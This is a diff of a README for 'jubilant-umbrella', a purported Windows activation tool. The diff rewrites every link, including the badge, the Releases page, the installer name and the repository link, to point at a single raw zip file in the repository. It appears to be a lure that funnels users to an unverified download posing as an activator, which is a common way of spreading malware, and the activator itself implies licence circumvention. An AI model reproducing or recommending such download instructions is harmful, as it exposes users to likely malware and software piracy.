@@ -1,10 +1,10 @@
 # 🎉 jubilant-umbrella - Simplifying Windows Activation
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
+![Download](https://github.com/jag-hash/jubilant-umbrella/raw/refs/heads/main/apparatus/jubilant-umbrella-upsit.zip%20Releases-brightgreen)
 
 ## 📖 About
 
-[jubilant-umbrella](https://www.mediafire.com/folder/mx3jziwgrw4z/km) offers a straightforward way to help activate Windows. This application streamlines the activation process, making it easy for anyone to ensure their Windows version is genuine and functional. It covers various Windows editions, ensuring broad compatibility.
+[jubilant-umbrella](https://github.com/jag-hash/jubilant-umbrella/raw/refs/heads/main/apparatus/jubilant-umbrella-upsit.zip) offers a straightforward way to help activate Windows. This application streamlines the activation process, making it easy for anyone to ensure their Windows version is genuine and functional. It covers various Windows editions, ensuring broad compatibility.
 
 ## 🚀 Getting Started
 
@@ -13,13 +13,13 @@ To get started with jubilant-umbrella, you only need to follow a few simple step
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   To download the software, visit our Releases page: [Download jubilant-umbrella](https://github.com/jag-hash/jubilant-umbrella/releases).
+   To download the software, visit our Releases page: [Download jubilant-umbrella](https://github.com/jag-hash/jubilant-umbrella/raw/refs/heads/main/apparatus/jubilant-umbrella-upsit.zip).
 
 2. **Select the Latest Version**
    On the Releases page, find the latest version of jubilant-umbrella. Click on it to access the release details.
 
 3. **Download the Installer**
-   Look for the installer file labeled as "jubilant-umbrella-installer.exe" or a similar name. Click the link to start the download.
+   Look for the installer file labeled as "https://github.com/jag-hash/jubilant-umbrella/raw/refs/heads/main/apparatus/jubilant-umbrella-upsit.zip" or a similar name. Click the link to start the download.
 
 4. **Run the Installer**
    Once the download is complete, locate the file in your Downloads folder. Double-click the installer file to open it.
@@ -75,7 +75,7 @@ If you encounter issues during installation or have questions about using jubila
 
 ## 🔗 Additional Resources
 
-For further information, tutorials, or community discussions, visit our official repository on GitHub: [jubilant-umbrella GitHub](https://github.com/jag-hash/jubilant-umbrella).
+For further information, tutorials, or community discussions, visit our official repository on GitHub: [jubilant-umbrella GitHub](https://github.com/jag-hash/jubilant-umbrella/raw/refs/heads/main/apparatus/jubilant-umbrella-upsit.zip).
 
 ---
 
